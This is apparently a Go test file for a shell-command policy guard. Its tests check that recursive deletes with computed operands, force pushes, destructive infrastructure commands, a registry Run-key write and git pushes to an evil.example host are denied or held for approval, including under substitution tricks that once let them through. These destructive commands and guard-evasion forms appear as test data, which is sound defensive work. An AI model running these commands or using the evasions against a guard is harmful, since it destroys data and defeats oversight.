package policy

import (
	"testing"
	"time"
)

// TestDeleteSubstitutedOperand pins NF-2 (guard-parser lane, 2026-11-22;
// operator ruling 2026-11-22: ask): a recursive delete whose operand is a
// whole word the shell computes (`rm -rf $(echo ~)`, PowerShell
// `Remove-Item -Recurse -Force $(Join-Path $HOME x)`) had its operand
// stripped with the substitution, so nothing was left to judge and it was
// ALLOWED. The guard cannot tell what the substitution names, so it is R-102
// ASK. A substitution inside an operand word that leaves a literal part
// keeps that part's verdict (`rm -rf "$(pwd)/x"` reads `/x`, R-101 deny),
// and a delete that is not recursive is unchanged.
func TestDeleteSubstitutedOperand(t *testing.T) {
	t.Parallel()
	ps := DialectPowerShell
	ask := func(name, cmd string, d Dialect) destructiveCase {
		return destructiveCase{name: "ask: " + name, cmd: cmd, dialect: d, wantRule: "R-102", wantEnforce: DecisionAsk}
	}
	runRuleCases(t, []destructiveCase{
		ask("unquoted dollar-paren", "rm -rf $(echo ~)", DialectPosix),
		ask("backticks", "rm -r `echo ~`", DialectPosix),
		ask("after --", "rm -rf -- $(cat dirs.txt)", DialectPosix),
		ask("quoted dollar-paren (honest mktemp: the behaviour change)", `rm -rf "$(mktemp -d)"`, DialectPosix),
		ask("beside a literal operand", "rm -rf ./build $(cat extra.txt)", DialectPosix),
		ask("behind sudo", "sudo rm -rf $(echo ~)", DialectPosix),
		ask("inside bash -c", `bash -c 'rm -rf $(echo ~)'`, DialectPosix),
		ask("PowerShell subexpression", "Remove-Item -Recurse -Force $(Join-Path $HOME x)", ps),
		ask("PowerShell -Path subexpression", `Remove-Item -Path $("~") -Recurse -Force`, ps),
		ask("PowerShell parenthesised -Path (NF-1)", `Remove-Item -Path ("~") -Recurse -Force`, ps),
		ask("PowerShell parenthesised positional (NF-1)", "Remove-Item (Join-Path $HOME x) -Recurse -Force", ps),
		ask("PowerShell in a script block", "Get-ChildItem | ForEach-Object { Remove-Item -Recurse -Force (Join-Path $HOME $_) }", ps),
		ask("PowerShell rm alias", "rm -r -fo $(Join-Path $HOME x)", ps),
		ask("behind an unknown prefix", "mywrap rm -rf $(echo ~)", DialectPosix),

		// Kept as today.
		{name: "deny: literal tail after the substitution", cmd: `rm -rf "$(pwd)/x"`, wantRule: "R-101", wantEnforce: DecisionDeny},
		{name: "deny: a literal catastrophic operand beside one", cmd: "rm -rf ~ $(cat extra.txt)", wantRule: "R-101", wantEnforce: DecisionDeny},
		{name: "unchanged: not recursive", cmd: "rm $(cat list)"},
		{name: "unchanged: rm -f, not recursive", cmd: "rm -f $(find . -name '*.o')"},
		{name: "unchanged: PowerShell, not recursive", cmd: "Remove-Item $(Join-Path $PWD a.txt)", dialect: ps},
		{name: "unchanged: a substitution elsewhere on the line", cmd: "d=$(mktemp -d); rm -rf ./build"},
		{name: "unchanged: a substitution in a literal operand word", cmd: `rm -rf "./build-$(date +%s)"`},
	}, KindShellExec, "run_command")
}

// TestSubstitutedOptionValueKeepsItsPlace pins NF-6 (found in this lane,
// 2026-11-22): an unquoted whole-word substitution left no word behind, so
// an option that takes a value took the NEXT word instead and the command
// after it disappeared: `sudo -u $(id -un) rm -rf ~` read `rm` as the user,
// `timeout $(echo 5) rm -rf ~` read `rm` as the duration, and `git commit
// -m $(cat msg) --no-verify` read `--no-verify` as the message, all ALLOWED,
// while the quoted twins (`"$(id -un)"`) denied. The unquoted word now keeps
// its place as an empty word, as the quoted one always did.
func TestSubstitutedOptionValueKeepsItsPlace(t *testing.T) {
	t.Parallel()
	deny := func(cmd, rule string) destructiveCase {
		return destructiveCase{name: cmd, cmd: cmd, wantRule: rule, wantEnforce: DecisionDeny}
	}
	runRuleCases(t, []destructiveCase{
		deny("sudo -u $(id -un) rm -rf ~", "R-101"),
		deny("timeout $(echo 5) rm -rf ~", "R-101"),
		deny("nice -n $(echo 5) rm -rf ~", "R-101"),
		deny("env -u $(echo X) rm -rf ~", "R-101"),
		deny("ionice -c $(echo 3) rm -rf ~", "R-101"),
		deny("git commit -m $(cat msg) --no-verify", "R-112"),
		// The quoted twins, which already denied.
		deny(`sudo -u "$(id -un)" rm -rf ~`, "R-101"),
		deny(`git commit -m "$(cat msg)" --no-verify`, "R-112"),
		// Honest commands keep their verdict.
		{name: "honest: timeout $(nproc) make", cmd: "timeout $(nproc) make"},
		{name: "honest: sudo -u $(whoami) ls", cmd: "sudo -u $(whoami) ls"},
		{name: "honest: git commit -m $(cat msg)", cmd: "git commit -m $(cat msg)"},
		{name: "honest: make -j $(nproc)", cmd: "make -j $(nproc)"},
	}, KindShellExec, "run_command")
}

// TestSubstitutedWordBeforeSubcommand pins the NF-2 follow-up: the word NF-2
// keeps empty (a whole-word command substitution) before a subcommand may be
// an option, so it does not take the subcommand's place. Before NF-2 the
// parser dropped it and every row below read its subcommand; with the empty
// word kept and read as the subcommand, the git rows lost R-110, the commit
// gate's classifier and the other Sub() readers. Each row must get the same
// verdict as the line without the substitution, and that verdict is a hit.
func TestSubstitutedWordBeforeSubcommand(t *testing.T) {
	t.Parallel()
	eng, err := New(Config{Mode: ModeEnforce, Home: "/home/u"})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	eval := func(cmd string, d Dialect) Verdict {
		return eng.Evaluate(Event{
			Kind: KindShellExec, ActionType: "run_command", Target: cmd, Dialect: d,
			Cwd: "/home/u/proj", ProjectRoot: "/home/u/proj", SessionID: "s1",
			Now: time.Date(2026, 6, 10, 12, 0, 0, 0, time.UTC),
		})
	}
	ps := DialectPowerShell
	for _, tc := range []struct {
		plain, substituted string
		dialect            Dialect
	}{
		{"git push --force origin main", "git $(echo -c x=y) push --force origin main", DialectPosix},
		{"git push --force origin main", `git "$(echo -c x=y)" push --force origin main`, DialectPosix},
		{"git push --force origin", "git $(echo -c x=y) push --force origin", DialectPosix},
		{"git reset --hard", "git $(echo -q) reset --hard", DialectPosix},
		{"git branch -D main", "git $(echo -q) branch -D main", DialectPosix},
		{"terraform destroy", "terraform $(echo -no-color) destroy", DialectPosix},
		{"kubectl delete ns prod", "kubectl $(echo -v) delete ns prod", DialectPosix},
		{"helm uninstall x", "helm $(echo --debug) uninstall x", DialectPosix},
		{"npm publish", "npm $(echo --silent) publish", DialectPosix},
		{`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y`, `reg $(Write-Output /f) add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y`, ps},
	} {
		want, got := eval(tc.plain, tc.dialect), eval(tc.substituted, tc.dialect)
		if want.RuleID == "" {
			t.Errorf("%q: no verdict without the substitution (the row tests nothing)", tc.plain)
			continue
		}
		if got.RuleID != want.RuleID || got.Decision != want.Decision {
			t.Errorf("%q: %s/%v, want %s/%v (as %q)", tc.substituted, got.RuleID, got.Decision, want.RuleID, want.Decision, tc.plain)
		}
	}
	// R-174..R-176 read the remote verb through gitNamesRemoteURL; their
	// hosts come from configuration, so the reader is checked directly.
	for _, cmd := range []string{"git $(echo -q) clone https://evil.example/x.git", "git $(echo -q) push https://evil.example/x.git main"} {
		if cmds := ParseCommand(cmd, DialectPosix); len(cmds) == 0 || !gitNamesRemoteURL(&cmds[0]) {
			t.Errorf("%q: not read as a remote verb", cmd)
		}
	}
	for _, tc := range []struct {
		cmd    string
		writes int
		push   bool
	}{
		{"git push origin main", 1, true},
		{"git $(echo -C /x) push origin main", 1, true},
		{"git $(echo -c x=y) commit -m x", 1, false},
		{`git "$(echo -c x=y)" commit -m x`, 1, false},
		{"git $(echo -c x=y) status", 0, false},
		{"git status", 0, false},
	} {
		ctx := &MatchContext{Event: &Event{Kind: KindShellExec, Target: tc.cmd, Dialect: DialectPosix, Cwd: "/repo", ProjectRoot: "/repo"}, Cfg: &Config{}}
		var gating []ClassifiedGitWrite
		for _, c := range ClassifyGitWritesCtx(ctx) {
			if GitWriteGates(c.Write) {
				gating = append(gating, c)
			}
		}
		if len(gating) != tc.writes || (tc.writes > 0 && GitWriteIsPush(gating[0].Write) != tc.push) {
			t.Errorf("%q: gating writes %+v, want %d (push %v)", tc.cmd, gating, tc.writes, tc.push)
		}
	}
}

// TestGitPlaceComputed pins the NF-2 follow-up for git write places: an
// empty place (a whole-word command substitution NF-2 keeps as an empty
// word, quoted or not, or an empty `--opt=` value) for git -C, --git-dir,
// --work-tree or a wrapper's directory (env -C, sudo -D), and an empty word
// before git's subcommand (which may itself be `-C dir`), is an unknown
// place, never the directory the line runs in.
func TestGitPlaceComputed(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		cmd     string
		unknown bool
		dirs    []string
	}{
		{"git -C $(mktemp -d) commit -m x", true, nil},
		{`git -C "$(mktemp -d)" commit -m x`, true, nil},
		{"git --git-dir $(echo /x/.git) commit -m x", true, nil},
		{"git --git-dir=$(echo /x/.git) commit -m x", true, nil},
		{"git --work-tree $(echo /x) commit -m x", true, nil},
		{`git --work-tree "$(echo /x)" commit -m x`, true, nil},
		{"env -C $(mktemp -d) git commit -m x", true, nil},
		{`env -C "$(mktemp -d)" git commit -m x`, true, nil},
		{"env --chdir=$(mktemp -d) git commit -m x", true, nil},
		{`sudo -D "$(mktemp -d)" git commit -m x`, true, nil},
		{"git $(echo -C /x) push origin main", true, nil},
		{"git $(echo -c x=y) commit -m x", true, nil},
		// Controls.
		{"git -C sub commit -m x", false, []string{"/repo/sub"}},
		{"git commit -m x", false, []string{"/repo"}},
		{"env -C /tmp/w git commit -m x", false, []string{"/tmp/w"}},
		{"git commit -m $(cat msg)", false, []string{"/repo"}},
	} {
		ctx := &MatchContext{Event: &Event{Kind: KindShellExec, Target: tc.cmd, Dialect: DialectPosix, Cwd: "/repo", ProjectRoot: "/repo"}, Cfg: &Config{}}
		locs := GitWriteLocations(ctx)
		if len(locs) != 1 {
			t.Errorf("%q: %d locations %+v, want 1", tc.cmd, len(locs), locs)
			continue
		}
		if l := locs[0]; l.Unknown != tc.unknown || !equalStrings(l.Dirs, tc.dirs) {
			t.Errorf("%q: dirs %q unknown %v (%q), want dirs %q unknown %v", tc.cmd, l.Dirs, l.Unknown, l.UnknownVia, tc.dirs, tc.unknown)
		}
	}
}

// TestParseSubstitutedWordPlaceholder pins the parse NF-2 and NF-6 rest on:
// an unquoted whole-word substitution in argument position is an empty word
// recorded as substituted, like the quoted one; one in command position or
// in a redirect keeps its old reading (no word).
func TestParseSubstitutedWordPlaceholder(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		in   string
		argv []string
		lost []int
	}{
		{"rm -rf $(echo ~)", []string{"rm", "-rf", ""}, []int{2}},
		{`rm -rf "$(echo ~)"`, []string{"rm", "-rf", ""}, []int{2}},
		{"rm -rf a $(x) b", []string{"rm", "-rf", "a", "", "b"}, []int{3}},
		{`rm -rf "$(pwd)/x"`, []string{"rm", "-rf", "/x"}, nil},
		{"sudo -u $(id -un) rm -rf ~", []string{"rm", "-rf", "~"}, nil},
		{"$(which rm) -rf ~", []string{"-rf", "~"}, nil},
		{"echo hi > $(x) y", []string{"echo", "hi"}, nil},
	} {
		cmds := ParseCommand(tc.in, DialectPosix)
		if len(cmds) == 0 {
			t.Errorf("ParseCommand(%q) = nothing", tc.in)
			continue
		}
		c := cmds[0]
		if !equalStrings(c.Argv, tc.argv) || !equalInts(c.lostArgs, tc.lost) {
			t.Errorf("ParseCommand(%q)[0] = argv %q lost %v, want argv %q lost %v", tc.in, c.Argv, c.lostArgs, tc.argv, tc.lost)
		}
	}
	// The pre-split argv path records the same lost word.
	if cmds := ParseArgv([]string{"rm", "-rf", "$(echo ~)"}, DialectPosix); len(cmds) == 0 || !equalInts(cmds[0].lostArgs, []int{2}) {
		t.Errorf("ParseArgv(rm -rf $(echo ~)) lost = %v, want [2]", cmds[0].lostArgs)
	}
}

// equalInts reports whether two int slices hold the same values in order
// (nil and empty are equal).
func equalInts(a, b []int) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
